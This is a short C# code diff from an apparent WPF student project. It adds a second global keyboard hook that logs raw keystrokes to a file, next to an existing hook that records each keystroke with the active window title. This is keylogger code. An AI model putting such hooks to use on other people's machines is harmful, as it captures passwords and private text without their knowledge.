@@ -54,9 +54,10 @@ namespace AbschlussprojektWPF
                 clsLogger logFile = new clsLogger(); 
                 KeystrokeAPI ki = new KeystrokeAPI();
                 api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + "\r\n\r\n"); ; });
+                api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeysOnly.txt", character + "\r\n\r\n"); ; });
             }
-            wndMessageBoxStartLog wndMessageBoxStartedLog = new wndMessageBoxStartLog();
-            wndMessageBoxStartedLog.Show();
+            wndMessageBoxStartLog wndMessageBoxStartLog = new wndMessageBoxStartLog();
+            wndMessageBoxStartLog.Show();
         }
     }
 }
